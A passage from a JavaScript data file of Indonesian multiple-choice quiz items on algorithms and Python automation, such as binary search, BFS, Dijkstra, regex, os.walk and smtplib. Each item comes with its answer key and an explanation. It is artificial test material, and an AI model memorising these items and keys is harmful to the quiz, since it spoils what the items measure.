    "scenario": "Pengembang ingin menerapkan fungsi `binary_search(list_data, target)` untuk mempercepat pencarian NIK karyawan pada database. Namun algoritma selalu memberikan hasil salah atau elemen tidak ditemukan.",
    "workedExample": {
      "kasusSerupa": "Algoritma Linear Search yang dapat mencari data pada struktur array dalam kondisi apa pun.",
      "jawabanBenarContoh": "Linear Search bekerja pada data terurut maupun data acak tak beraturan.",
      "nalarBayi": "Metode pencarian sekuensial linear menyusuri setiap wadah satu per satu tanpa mensyaratkan susunan khusus."
    },
    "question": "Kondisi prasyarat apakah yang WAJIB dipenuhi oleh sekumpulan data agar algoritma Binary Search dapat beroperasi dengan benar?",
    "options": [
      "Jumlah elemen data harus berjumlah genap",
      "Elemen data harus sudah dalam keadaan terurut (sorted)",
      "Data harus disimpan di dalam memori cache L1",
      "Semua data harus bertipe teks alfabet kapital"
    ],
    "correctIndex": 1,
    "explanation": "Binary Search bekerja dengan membandingkan nilai target terhadap elemen tengah dan mengeliminasi separuh daftar yang salah. Logika pemotongan separuh ini hanya valid jika elemen sudah terurut (sorted).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-3",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Struktur Data Tabel Hash dan Kompleksitas Pencarian O(1)",
    "sourceRef": "Grokking Algorithms: Chapter 5 (Hash Tables)",
    "scenario": "Sistem kasir toko swalayan perlu mencari harga barang berdasarkan nomor barcode secara instan tanpa perlu melakukan looping berulang pada jutaan produk. Pengembang memilih struktur data Hash Table (Dictionary di Python).",
    "workedExample": {
      "kasusSerupa": "Mencari elemen data pada struktur array biasa dengan memindai seluruh indeks dari awal hingga akhir.",
      "jawabanBenarContoh": "Kompleksitas pencarian array acak adalah O(n).",
      "nalarBayi": "Pencarian array membutuhkan waktu O(n)."
    },
    "question": "Berapakah rata-rata kompleksitas waktu (average-case time complexity) untuk operasi pencarian data pada struktur data Hash Table (Dictionary)?",
    "options": [
      "O(n!) - Waktu Faktorial",
      "O(1) - Waktu Konstan",
      "O(log n) - Waktu Logaritmik",
      "O(n) - Waktu Linier"
    ],
    "correctIndex": 1,
    "explanation": "Hash Table menggunakan fungsi hash matematis untuk memetakan kunci langsung ke indeks memori array. Pada kasus rata-rata (average case), pencarian berlangsung dalam waktu konstan O(1).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-4",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Pencarian Jalur Terpendek pada Graf Tak Berbobot: Breadth-First Search (BFS)",
    "sourceRef": "Grokking Algorithms: Chapter 6 (Breadth-First Search)",
    "scenario": "Sebuah aplikasi media sosial ingin mencari derajat koneksi terpendek antara Pengguna A dan Pengguna B (misalnya: teman tingkat 1, teman dari teman tingkat 2, dst). Graf koneksi pertemanan tidak memiliki bobot angka.",
    "workedExample": {
      "kasusSerupa": "Menjelajahi pohon graf dengan menelusuri satu cabang sedalam-dalamnya hingga titik buntu sebelum mundur kembali.",
      "jawabanBenarContoh": "Depth-First Search (DFS) — penelusuran mendalam berbasis struktur tumpukan (Stack).",
      "nalarBayi": "DFS menelusuri cabang ke bawah sampai mentok."
    },
    "question": "Algoritma penelusuran graf manakah yang menggunakan antrean (Queue) untuk memeriksa simpul tetangga lapis demi lapis guna menemukan jalur terpendek pada graf tak berbobot?",
    "options": [
      "Linear Bubble Sort",
      "Binary Insertion",
      "Depth-First Search (DFS)",
      "Breadth-First Search (BFS)"
    ],
    "correctIndex": 3,
    "explanation": "Breadth-First Search (BFS) mengeksplorasi simpul-simpul graf lapis demi lapis secara melebar menggunakan antrean FIFO. Pada graf tak berbobot, BFS selalu menemukan jalur dengan jumlah tepi (edge) paling sedikit.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-5",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Jalur Terpendek pada Graf Berbobot Positif: Algoritma Dijkstra",
    "sourceRef": "Grokking Algorithms: Chapter 7 (Dijkstra's Algorithm)",
    "scenario": "Aplikasi navigasi peta GPS mobil harus mencari rute tercepat dari Kantor ke Bandara. Setiap ruas jalan memiliki bobot waktu tempuh (menit) yang berbeda-beda karena kepadatan lalu lintas.",
    "workedExample": {
      "kasusSerupa": "Mencari jalur terpendek pada graf dengan jarak antar simpul yang semuanya bernilai seragam 1 langkah.",
      "jawabanBenarContoh": "BFS (Breadth-First Search) — optimal untuk graf tanpa bobot.",
      "nalarBayi": "BFS untuk langkah tanpa bobot."
    },
    "question": "Algoritma manakah yang digunakan untuk mencari jalur dengan total biaya/bobot terkecil pada graf berbobot (weighted graph) di mana seluruh bobot bernilai positif?",
    "options": [
      "Euclidean GCD",
      "Breadth-First Search biasa",
      "Selection Sort",
      "Algoritma Dijkstra"
    ],
    "correctIndex": 3,
    "explanation": "Algoritma Dijkstra menemukan jalur terpendek dari satu simpul sumber ke semua simpul lain dalam graf berbobot positif dengan selalu memperbarui jarak minimum tentatif simpul yang belum dikunjungi.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-6",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Strategi Pecah dan Taklukkan (Divide and Conquer): Quicksort",
    "sourceRef": "Grokking Algorithms: Chapter 4 (Quicksort)",
    "scenario": "Algoritma Quicksort mengurutkan array angka dengan memilih sebuah elemen sebagai poros ('pivot'), lalu mempartisi sisa array menjadi dua sub-array: yang lebih kecil dari pivot dan yang lebih besar dari pivot, kemudian memanggil dirinya sendiri.",
    "workedExample": {
      "kasusSerupa": "Menghitung kompleksitas waktu rata-rata algoritma Bubble Sort sederhana yang membandingkan setiap pasangan elemen bersebelahan.",
      "jawabanBenarContoh": "O(n^2) — Waktu Kuadratik (karena membutuhkan dua lapis perulangan for bertingkat).",
      "nalarBayi": "Bubble Sort lambat karena memakan waktu kuadratik O(n^2)."
    },
    "question": "Berapakah rata-rata kompleksitas waktu (average time complexity) dari algoritma pengurutan Quicksort saat memilih pivot yang baik?",
    "options": [
      "O(n log n)",
      "O(n^2)",
      "O(log n)",
      "O(1)"
    ],
    "correctIndex": 0,
    "explanation": "Quicksort memiliki performa rata-rata O(n log n) yang sangat cepat dalam praktik berkat faktor konstanta kecil dan pemanfaatan cache lokal, meskipun kasus terburuknya adalah O(n^2) jika pivot sangat buruk.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-7",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Struktur Fungsi Rekursif: Syarat Berhenti (Base Case)",
    "sourceRef": "Grokking Algorithms: Chapter 3 (Recursion)",
    "scenario": "Seorang programmer menulis fungsi rekursif untuk menghitung faktorial angka. Namun saat dijalankan, program mengalami crash fatal dengan pesan galat 'RecursionError: maximum recursion depth exceeded in comparison' (Stack Overflow).",
    "workedExample": {
      "kasusSerupa": "Bagian dari fungsi rekursif yang memanggil kembali dirinya sendiri dengan argumen yang semakin mengecil.",
      "jawabanBenarContoh": "Recursive Step (Langkah Pemanggilan Diri Sendiri).",
      "nalarBayi": "Langkah rekursif memanggil diri sendiri."
    },
    "question": "Bagian penting apakah yang WAJIB ada di dalam setiap fungsi rekursif agar fungsi tersebut berhenti dan tidak memicu terjadinya Stack Overflow?",
    "options": [
      "While loop tak terhingga",
      "Thread sleep delay",
      "Base Case (Kondisi dasar penghenti)",
      "Global variable counter"
    ],
    "correctIndex": 2,
    "explanation": "Setiap fungsi rekursif harus memiliki Base Case (kondisi terminasi di mana hasil langsung dikembalikan tanpa memanggil fungsi lagi) untuk mencegah perulangan tak terbatas yang menyebabkan call stack meluap.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-8",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Manajemen Berkas Python Aman Menggunakan Pernyataan with open()",
    "sourceRef": "Automate the Boring Stuff with Python: Chapter 9 (Reading and Writing Files)",
    "scenario": "Saat memproses ratusan file log di server, pengembang ingin memastikan file selalu tertutup (closed) secara otomatis bahkan jika skrip mengalami galat crash di tengah proses pembacaan data.",
    "workedExample": {
      "kasusSerupa": "Membuka berkas file di Python secara manual menggunakan f = open('data.txt') lalu menutupnya di akhir kode.",
      "jawabanBenarContoh": "f.close() — rentan lupa ditutup atau terlewat bila terjadi error di tengah baris kode.",
      "nalarBayi": "Cara manual rentan lupa close(). Menggunakan pernyataan 'with open()' menjamin file pasti ditutup secara otomatis oleh Python bahkan bila terjadi error!."
    },
    "question": "Mengapa penggunaan blok konstruksi `with open('data.txt') as file:` sangat direkomendasikan dalam Python dibanding `open()` biasa?",
    "options": [
      "Karena mempercepat kecepatan baca harddisk hingga dua kali lipat",
      "Karena mengubah file teks biasa menjadi file database SQL",
      "Karena otomatis mengenkripsi isi file dengan algoritma AES",
      "Karena secara otomatis menutup file setelah blok selesai dieksekusi, bahkan jika terjadi error eksepsi"
    ],
    "correctIndex": 3,
    "explanation": "Konstruksi `with` mengimplementasikan protokol context manager (`__enter__` dan `__exit__`), menjamin penutupan berkas (`f.close()`) secara deterministik saat keluar dari blok, mencegah kebocoran sumber daya sistem.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-9",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Ekstraksi Pola Teks Log: Regular Expressions re di Python",
    "sourceRef": "Automate the Boring Stuff with Python: Chapter 7 (Pattern Matching with Regular Expressions)",
    "scenario": "Administrator ingin menulis skrip Python untuk mengekstrak seluruh alamat IPv4 yang tercatat di dalam file log firewall ribuan baris. Pola IPv4 terdiri dari 4 kelompok angka (1-3 digit) yang dipisahkan oleh karakter titik.",
    "workedExample": {
      "kasusSerupa": "Menulis pola ekspresi reguler (Regex) untuk mencocokkan tepat satu kata karakter alfabet di Python.",
      "jawabanBenarContoh": "Pola r'\\w+' — mencocokkan satu atau lebih karakter kata.",
      "nalarBayi": "Pola \\w+ mencocokkan huruf kata."
    },
    "question": "Pola ekspresi reguler (regex) manakah yang paling tepat digunakan untuk mendeteksi format alamat IP dasar (4 grup angka 1-3 digit dipisahkan titik)?",
    "options": [
      "\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}",
      "\\w+@\\w+\\.\\w+",
      "^\\$\\d+\\.\\d{2}$",
      "[a-z]{1,3}\\.[a-z]{1,3}"
    ],
    "correctIndex": 0,
    "explanation": "`\\d{1,3}` mencocokkan antara 1 hingga 3 digit angka numerik, dan `\\.` meng-escape tanda titik agar diperlakukan sebagai karakter titik literal, bukan wildcard sembarang karakter.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-10",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Penyederhanaan Perulangan dengan List Comprehension Python",
    "sourceRef": "Automate the Boring Stuff with Python / Eloquent IT",
    "scenario": "Pengembang memiliki daftar nomor port jaringan `ports = [80, 443, 22, 21, 8080, 3306]` dan ingin membuat daftar baru yang hanya berisi nomor port yang nilainya lebih dari 100 secara ringkas dalam satu baris ekspresi elegan.",
    "workedExample": {
      "kasusSerupa": "Membuat daftar baru dari perulangan for loop standar dengan metode list.append() di Python.",
      "jawabanBenarContoh": "result = [] lalu melakukan for item in data: if kondisi: result.append(item).",
      "nalarBayi": "For loop biasa butuh beberapa baris kode. Sintaks satu baris Python yang jauh lebih ringkas dan elegan untuk menyaring list adalah List Comprehension!."
    },
    "question": "Sintaks Python manakah yang menggunakan List Comprehension untuk memfilter daftar `ports` dan hanya mengambil nomor port yang lebih besar dari 100?",
    "options": [
      "{p: p > 100 for p in ports}",
      "ports.filter(p > 100)",
      "[p for p in ports if p > 100]",
      "for p in ports select p > 100"
    ],
    "correctIndex": 2,
    "explanation": "List comprehension menyediakan sintaks ringkas untuk membuat daftar baru berdasarkan iterable yang ada: `[ekspresi for item in iterable if kondisi]`, dieksekusi lebih efisien di level bytecode CPython.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-11",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Pengambilan Nilai Kamus Aman: Metode dict.get() dengan Nilai Default",
    "sourceRef": "Automate the Boring Stuff with Python: Chapter 5 (Dictionaries and Structuring Data)",
    "scenario": "Sebuah skrip membaca data konfigurasi JSON server: `config = {'port': 8080, 'host': 'localhost'}`. Jika skrip mencoba mengakses kunci yang belum tentu ada seperti `config['timeout']`, program akan melempar galat `KeyError` dan berhenti.",
    "workedExample": {
      "kasusSerupa": "Mengakses nilai dictionary Python menggunakan kurung siku data['kunci'] yang memicu KeyError bila kunci tidak ditemukan.",
      "jawabanBenarContoh": "data['kunci'] — menghasilkan Crash KeyError jika kunci absen di kamus.",
      "nalarBayi": "Pola analisis kasus serupa: Menelaah mengakses nilai dictionary python menggunakan kurung siku data['kunci'] yang memicu keyerror bila kunci tidak ditemukan. untuk mengidentifikasi solusi yang tepat secara bertahap."
    },
    "question": "Metode dictionary Python manakah yang digunakan untuk mengambil nilai dari sebuah kunci dan menyediakan nilai default cadangan jika kunci tersebut tidak ditemukan di dalam kamus?",
    "options": [
      "dict.lookup(key)",
      "dict.fetch_or_zero(key)",
      "dict.find(key, default)",
      "dict.get(key, default)"
    ],
    "correctIndex": 3,
    "explanation": "Metode `.get(key, default_value)` pada dictionary Python mengembalikan nilai dari kunci jika ada di dalam dictionary; jika kunci tidak ada, metode mengembalikan nilai default yang ditentukan (atau `None`) alih-alih melempar `KeyError`.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-12",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Penanganan Galat Runtime: Blok try, except, dan finally di Python",
    "sourceRef": "Automate the Boring Stuff with Python: Chapter 11 (Debugging)",
    "scenario": "Skrip automasi membuka koneksi socket ke server basis data, menjalankan kueri, dan harus SELALU menutup koneksi socket tersebut, baik kueri berhasil dijalankan maupun gagal akibat kesalahan sintaks SQL.",
    "workedExample": {
      "kasusSerupa": "Menangkap pesan kesalahan spesifik saat terjadi kegagalan pembagian angka nol di Python.",
      "jawabanBenarContoh": "except ZeroDivisionError as e — menangkap jenis galat pembagian nol secara spesifik.",
      "nalarBayi": "Pola analisis kasus serupa: Menelaah menangkap pesan kesalahan spesifik saat terjadi kegagalan pembagian angka nol di python. untuk mengidentifikasi solusi yang tepat secara bertahap."
    },
    "question": "Klausul manakah dalam penanganan eksepsi Python yang DIJAMIN SELALU dieksekusi pada akhir proses pembersihan, tidak peduli apakah terjadi error atau tidak?",
    "options": [
      "finally",
      "catch",
      "else",
      "retry"
    ],
    "correctIndex": 0,
    "explanation": "Klausul `finally` selalu dijalankan sebelum meninggalkan blok pernyataan try-except. Ini umumnya digunakan untuk operasi pelepasan sumber daya eksternal (seperti menutup koneksi jaringan atau file descriptor).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-13",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Menjelajah Pohon Direktori Rekursif dengan os.walk()",
    "sourceRef": "Automate the Boring Stuff with Python: Chapter 10 (Organizing Files)",
    "scenario": "Administrator ingin membuat skrip automasi untuk mencari dan menghapus seluruh file temporary berekstensi `.tmp` yang tersimpan di dalam folder proyek dan seluruh subfolder anak cucunya yang bersarang sangat dalam.",
    "workedExample": {
      "kasusSerupa": "Membaca daftar file yang berada tepat di satu folder direktori saja tanpa menelusuri sub-folder.",
      "jawabanBenarContoh": "os.listdir('/path/folder') — hanya menampilkan file di tingkat direktori teratas.",
      "nalarBayi": "Pola analisis kasus serupa: Menelaah membaca daftar file yang berada tepat di satu folder direktori saja tanpa menelusuri sub-folder. untuk mengidentifikasi solusi yang tepat secara bertahap."
    },
    "question": "Fungsi pada modul bawaan `os` di Python manakah yang digunakan untuk menjelajahi struktur pohon direktori secara rekursif hingga ke subdirektori terdalam?",
    "options": [
      "os.walk()",
      "os.chdir()",
      "os.mkdir()",
      "os.listdir()"
    ],
    "correctIndex": 0,
    "explanation": "`os.walk(path)` menghasilkan generator yang menelusuri pohon direktori baik secara top-down maupun bottom-up, mengembalikan nama direktori root saat ini, direktori di dalamnya, dan berkas di dalamnya pada setiap tingkat.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-14",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Pemeriksaan Respons HTTP API: Kode Status 200 OK dengan Pustaka Requests",
    "sourceRef": "Automate the Boring Stuff with Python: Chapter 12 (Web Scraping & APIs)",
    "scenario": "Skrip monitoring mengecek kesehatan (health check) server backend setiap 10 detik dengan mengirim HTTP GET request menggunakan pustaka `requests`. Skrip harus memastikan bahwa server merespons dengan status keberhasilan sukses standar.",
    "workedExample": {
      "kasusSerupa": "Mengambil isi teks dokumen yang dikembalikan oleh web server setelah permintaan HTTP dikirimkan di Python.",
      "jawabanBenarContoh": "response.text / response.content — membaca isi konten balasan server.",
      "nalarBayi": "Response.text membaca isi dokumen."
    },
    "question": "Atribut apakah pada objek respons dari pustaka Python `requests` yang menyimpan nilai numerik kode status HTTP (seperti 200 atau 404)?",
    "options": [
      "response.http_number",
      "response.status_code",
      "response.header_code",
      "response.is_valid"
    ],
    "correctIndex": 1,
    "explanation": "Properti `response.status_code` mengembalikan integer representasi kode status HTTP dari server (misal: 200 untuk OK, 301 untuk redirect, 404 untuk Not Found, 500 untuk Server Error).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-15",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Serialisasi dan Parsing JSON di Python: json.loads vs json.dumps",
    "sourceRef": "Automate the Boring Stuff with Python: Chapter 16 (Working with CSV & JSON)",
    "scenario": "Skrip Python menerima data string berformat teks JSON dari REST API: `'{\"user\": \"admin\", \"active\": true}'`. Pengembang harus mengubah string tersebut menjadi objek Dictionary Python asli agar datanya bisa dimanipulasi.",
    "workedExample": {
      "kasusSerupa": "Mengubah objek dictionary Python menjadi teks string format JSON untuk dikirim ke server web (serialisasi).",
      "jawabanBenarContoh": "json.dumps(data) — mengonversi objek Python menjadi teks string JSON.",
      "nalarBayi": "json.dumps() mengemas objek jadi teks JSON."
    },
    "question": "Fungsi pada modul `json` di Python manakah yang digunakan untuk mem-parsing teks STRING berformat JSON menjadi objek Dictionary Python?",
    "options": [
      "json.parse_file()",
      "json.loads()",
      "json.dumps()",
      "json.export()"
    ],
    "correctIndex": 1,
    "explanation": "`json.loads(s)` (Load from String) menguraikan string JSON yang valid menjadi objek Python yang setara (kamus, daftar, dll). Sebaliknya, `json.dumps(obj)` mengonversi objek Python menjadi string teks JSON.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-16",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Struktur Data Linear: Perbedaan Antrean (Queue) vs Tumpukan (Stack)",
    "sourceRef": "Grokking Algorithms: Chapter 3 & 6 (Stacks and Queues)",
    "scenario": "Sistem antrean cetak printer kantor memproses dokumen cetak dengan urutan: dokumen yang dikirim paling awal akan dicetak terlebih dahulu (First-In, First-Out). Sebaliknya, fungsi tombol 'Undo' pada text editor membatalkan aksi yang paling terakhir diketik (Last-In, First-Out).",
    "workedExample": {
      "kasusSerupa": "Struktur data Tumpukan (Stack) yang bekerja dengan prinsip data terakhir masuk menjadi yang pertama keluar.",
      "jawabanBenarContoh": "LIFO (Last-In, First-Out) — seperti tumpukan piring di meja makan.",
      "nalarBayi": "Tumpukan (Stack) berprinsip LIFO."
    },
    "question": "Prinsip operasional apakah yang diterapkan oleh struktur data Antrean (Queue) dalam memproses elemen datanya?",
    "options": [
      "Random Access O(1)",
      "FIFO (First-In, First-Out)",
      "Highest Key First",
      "LIFO (Last-In, First-Out)"
    ],
    "correctIndex": 1,
    "explanation": "Queue (antrean) menerapkan prinsip FIFO (First-In, First-Out), di mana elemen yang pertama kali dimasukkan (enqueue) adalah yang pertama kali akan dikeluarkan dan diproses (dequeue).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-17",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Format Penamaan Arsip Cadangan Otomatis dengan Modul datetime",
    "sourceRef": "Automate the Boring Stuff with Python: Chapter 17 (Keeping Time)",
    "scenario": "Sebuah skrip pencadangan membuat file zip backup database setiap malam. Agar nama file terurut rapi menurut tanggal dan waktu di folder tanpa pernah saling menimpa, pengembang menggunakan format string `YYYY-MM-DD_HH-MM`.",
    "workedExample": {
      "kasusSerupa": "Mengubah teks string tanggal berformat '2026-10-09' menjadi objek datetime di Python.",
      "jawabanBenarContoh": "datetime.strptime(teks, format) — mengurai (parse) teks string menjadi objek tanggal.",
      "nalarBayi": "strptime mengurai teks jadi tanggal."
    },
    "question": "Metode manakah pada objek `datetime` di Python yang digunakan untuk memformat tanggal dan waktu saat ini menjadi string teks sesuai pola direktif (%Y, %m, %d)?",
    "options": [
      "datetime.to_string()",
      "datetime.timestamp_raw()",
      "datetime.strptime()",
      "datetime.strftime()"
    ],
    "correctIndex": 3,
    "explanation": "Metode `.strftime(format)` (String Format Time) mengonversi objek datetime menjadi representasi string berformat sesuai pola direktif tertentu, sering digunakan untuk memberi cap waktu pada nama file.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-18",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Optimasi Rekursi dengan Pemrograman Dinamis dan Memoization",
    "sourceRef": "Grokking Algorithms: Chapter 9 (Dynamic Programming)",
    "scenario": "Fungsi rekursif penghitung deret Fibonacci `fib(50)` berjalan sangat lambat hingga berjam-jam karena menghitung sub-masalah yang sama (seperti `fib(20)`) berulang-ulang miliaran kali dalam pohon percabangan.",
    "workedExample": {
      "kasusSerupa": "Menyelesaikan deret Fibonacci secara rekursif biasa tanpa optimasi yang menghitung ulang nilai yang sama berulang kali.",
      "jawabanBenarContoh": "Rekursi murni lambat berkecepatan eksponensial O(2 pangkat n).",
      "nalarBayi": "Pola analisis kasus serupa: Menelaah menyelesaikan deret fibonacci secara rekursif biasa tanpa optimasi yang menghitung ulang nilai yang sama berulang kali. untuk mengidentifikasi solusi yang tepat secara bertahap."
    },
    "question": "Teknik optimasi pemrograman manakah yang menyimpan hasil perhitungan dari pemanggilan fungsi berbiaya mahal ke dalam memori cache dan menggunakannya kembali saat input yang sama muncul?",
    "options": [
      "Memoization",
      "Recursive Branching",
      "Linear Garbage Collection",
      "Deadlock Detection"
    ],
    "correctIndex": 0,
    "explanation": "Memoization adalah teknik optimasi di mana hasil panggilan fungsi disimpan (dicache) berdasarkan parameter inputnya. Jika fungsi dipanggil lagi dengan parameter yang sama, hasil yang tersimpan dikembalikan langsung, memangkas waktu dari O(2^n) ke O(n).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-19",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Algoritma Serakah (Greedy): Solusi Pendekatan Masalah NP-Complete",
    "sourceRef": "Grokking Algorithms: Chapter 8 (Greedy Algorithms)",
    "scenario": "Masalah pemilihan stasiun radio penyiaran (Set-Covering Problem) membutuhkan pencarian kombinasi stasiun seminimal mungkin untuk mencakup 50 negara bagian. Mencari solusi optimal mutlak membutuhkan pengujian 2^50 kombinasi (mustahil selesai dalam waktu manusia).",
    "workedExample": {
      "kasusSerupa": "Algoritma Brute Force yang memeriksa seluruh kemungkinan kombinasi satu per satu demi menemukan solusi optimal sempurna.",
      "jawabanBenarContoh": "Brute Force — solusi pasti sempurna tetapi membutuhkan waktu komputasi yang luar biasa lambat.",
      "nalarBayi": "Brute force memeriksa semua kemungkinan."
    },
    "question": "Karakteristik utama apakah yang mendefinisikan strategi algoritma bertipe Greedy (Serakah)?",
    "options": [
      "Pada setiap langkah selalu memilih opsi yang tampak paling menguntungkan saat itu (locally optimal choice)",
      "Memutar balik langkah sebelumnya jika ditemukan jalan buntu (backtracking)",
      "Selalu mencoba seluruh kemungkinan kombinasi secara menyeluruh (exhaustive brute-force)",
      "Hanya dapat dijalankan pada komputer kuantum"
    ],
    "correctIndex": 0,
    "explanation": "Algoritma Greedy menyelesaikan masalah dengan membuat pilihan terbaik secara lokal pada setiap tahap dengan harapan pilihan tersebut akan mengarah pada solusi yang optimal secara global (atau hampiran yang sangat mendekati untuk masalah NP-hard).",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  },
  {
    "id": "it-algo-20",
    "category": "5. Algoritma & Automasi IT (Grokking & Python Automate)",
    "title": "Automasi Notifikasi Email Darurat Menggunakan Modul smtplib",
    "sourceRef": "Automate the Boring Stuff with Python: Chapter 18 (Sending Email and Text Messages)",
    "scenario": "Skrip pemantau server mendeteksi bahwa suhu ruang server melampaui 35°C. Skrip harus mengirimkan pesan peringatan darurat ke email ponsel tim teknisi on-call melalui server SMTP kantor yang mensyaratkan enkripsi TLS.",
    "workedExample": {
      "kasusSerupa": "Mengirimkan pesan teks SMS otomatis ke nomor ponsel darurat menggunakan gateway API.",
      "jawabanBenarContoh": "Mengirim request POST HTTP ke API layanan perpesanan SMS.",
      "nalarBayi": "SMS dikirim lewat API gateway."
    },
    "question": "Metode pada objek pustaka `smtplib` di Python manakah yang digunakan untuk mengaktifkan saluran enkripsi aman TLS sebelum mengirim kredensial login akun email?",
    "options": [
      "server.secure_mode_on()",
      "server.encrypt_all()",
      "server.open_ssl_now()",
      "server.starttls()"
    ],
    "correctIndex": 3,
    "explanation": "`server.starttls()` mengirim perintah STARTTLS ke server mail SMTP, meningkatkan koneksi soket biasa yang tidak aman menjadi koneksi terenkripsi TLS sebelum proses autentikasi (`server.login()`) dilakukan.",
    "babyClue": "💡 Petunjuk Nalar: Analisis kebutuhan skenario kasus dan cocokkan dengan konsep yang telah dipelajari."
  }
];

if (typeof module !== 'undefined' && module.exports) {
    module.exports = { itTechChallenges };
}
